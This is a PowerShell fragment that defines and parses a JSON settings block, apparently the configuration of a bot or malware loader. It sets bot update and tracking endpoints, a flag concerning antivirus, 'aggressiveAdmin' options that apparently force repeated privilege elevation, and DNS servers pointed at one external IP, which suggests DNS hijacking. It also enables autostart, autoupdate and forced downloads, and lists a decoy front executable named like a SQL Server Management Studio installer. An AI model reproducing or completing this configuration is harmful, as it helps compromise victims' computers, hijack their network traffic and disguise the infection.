
$server = @'
{
  "version": "2026.04.20 10:16:40",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "192.168.0.86",
  "server": "default",
  "primaryDns": "79.133.57.170",
  "secondaryDns": "79.133.57.170",
  "extraUpdate": false,
  "updateUrl": "http://192.168.0.86/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://192.168.0.86/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 1,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startUrlsForce": true,
  "startUrls": [],
  "frontForce": true,
  "front": [
    "vs_SSMS.exe"
  ],
  "embeddingsForce": true,
  "embeddings": []
}
'@ | ConvertFrom-Json
